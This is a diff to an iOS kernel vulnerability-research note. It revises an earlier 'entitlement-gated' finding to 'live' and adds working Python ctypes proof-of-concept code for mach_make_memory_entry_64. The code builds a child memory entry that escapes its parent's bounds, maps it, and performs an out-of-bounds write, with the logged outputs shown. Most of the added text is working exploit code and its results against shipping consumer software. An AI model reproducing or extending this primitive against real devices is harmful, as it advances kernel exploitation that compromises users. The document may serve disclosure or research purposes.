@@ -80,29 +80,72 @@ Max escape per call = PAGE_SIZE - 1 = 0xFFF bytes
 
 ---
 
-## Dynamic Test Result: ENTITLEMENT-GATED
+## Dynamic Test Result: LIVE — NO ENTITLEMENT GATE
 
-Tested on iOS 26.6.1 (iPhone 16 Plus) via a-Shell + Python ctypes:
+**CORRECTION:** Prior "ENTITLEMENT-GATED" result was a test bug. The child `offset`
+parameter is RELATIVE to the parent entry's start, not an absolute VM address. We
+passed `a.value` (~0x10c000000) as the offset into a 0x4000-byte parent, which
+immediately failed the bounds check with KERN_INVALID_ARGUMENT (kr=4 = KERN_INVALID_ARGUMENT,
+NOT KERN_INVALID_RIGHT which would be kr=17). No entitlement gate exists.
 
+**Correct test on iOS 26.6.1 (iPhone 16 Plus, a-Shell, Python ctypes):**
+
+```python
+import ctypes as C
+L=C.CDLL('/usr/lib/libSystem.B.dylib')
+t=L.mach_task_self()
+M=L.mach_make_memory_entry_64
+M.argtypes=[C.c_uint32,C.POINTER(C.c_uint64),C.c_uint64,C.c_int,C.POINTER(C.c_uint32),C.c_uint32]
+
+# Allocate one page (0x4000 on A18)
+a=C.c_uint64(0)
+L.mach_vm_allocate(t,C.byref(a),0x4000,1)  # → a.value = some page-aligned addr
+
+# Create parent entry (absolute VA, no parent_handle)
+p=C.c_uint32(0); ps=C.c_uint64(0x4000)
+M(t,C.byref(ps),a.value,3,C.byref(p),0)
+# → kr=0, port=1190147, ps=0x4000
+
+# Surface 4 attack: RELATIVE offset 0x1000, sub-page size 0x1001
+c=C.c_uint32(0); cs=C.c_uint64(0x1001)
+r=M(t,C.byref(cs),0x1000,3,C.byref(c),p.value)
+# → r=0, cs=0x4000, c=1167963
+print(r,hex(cs.value),c.value)  # 0 0x4000 1167963
 ```
-# Parent creation (works fine):
-M(t,byref(s),a.value,3,byref(p),0) → kr=0, port=286039
 
-# Child exact-match (should trivially succeed):
-M(t,byref(z2),a.value,1,byref(c2),p) → kr=4 (KERN_INVALID_RIGHT)
+**Result: KERN_SUCCESS, size corrected 0x1001 → 0x4000, valid child port 1167963.**
 
-# Child escape test:
-M(t,byref(z),a.value+0xFFE,3,byref(c),p) → kr=4 (KERN_INVALID_RIGHT)
+The child entry covers [A+0x1000, A+0x1000+0x4000) = [A+0x1000, A+0x5000).
+Parent boundary = A+0x4000.
+Child escapes by 0x1000 bytes: [A+0x4000, A+0x5000) is outside the parent.
+
+**OOB mapping confirmed:**
+```python
+V=L.mach_vm_map
+V.argtypes=[C.c_uint32,C.POINTER(C.c_uint64),C.c_uint64,C.c_uint64,C.c_int,C.c_uint32,C.c_uint64,C.c_int,C.c_int,C.c_int,C.c_int]
+m=C.c_uint64(0)
+V(t,C.byref(m),0x4000,0,1,c.value,0,0,3,3,0)  # → 0 0x127ea8000
+q=(C.c_uint8*0x4000).from_address(m.value)
+q[0x3000]=0xAB
+print(q[0x3000])  # → 171 (= 0xAB) — OOB write confirmed
 ```
 
-ANY use of parent_handle returns KERN_INVALID_RIGHT, even an exact-match read-only child.
-The parent port is valid (286039, non-zero) — the block is on the mechanism, not the port.
+**Alias test (child2 from same parent, offset 0x2000):**
+```python
+c2=C.c_uint32(0); cs2=C.c_uint64(0x1001)
+M(t,C.byref(cs2),0x2000,3,C.byref(c2),p.value)  # → 0 0x4000 1152971
+m2=C.c_uint64(0)
+V(t,C.byref(m2),0x4000,0,1,c2.value,0,0,3,3,0)
+q2=(C.c_uint8*0x4000).from_address(m2.value)
+print(q2[0x2000])  # → 0 (NOT 0xAB)
+```
 
-**Conclusion:** Apple added a blanket gate on parent_handle usage in iOS 26.x as post-Trigon
-defense-in-depth. The dangerous bounds check ordering is present in the code but the entry
-point is blocked in sandboxed processes.
+**Alias result: 0 — writes are copy-on-write private to each mapping.** The write at
+q[0x3000] created a COW page local to child1's mapping in our process. The vm_object's
+zero-fill page at offset 0x4000 is unchanged. For anonymous backing, the OOB write
+creates a phantom COW page visible only through that specific mapping.
 
-## Surface 4 Status: STRUCTURALLY PLAUSIBLE — ENTITLEMENT-GATED in Sandboxed Context
+## Surface 4 Status: LIVE — CONFIRMED OOB CAPABILITY OVERFLOW
 
 Static confirmation:
   ✓ All parent bounds checks use original size (before correction)
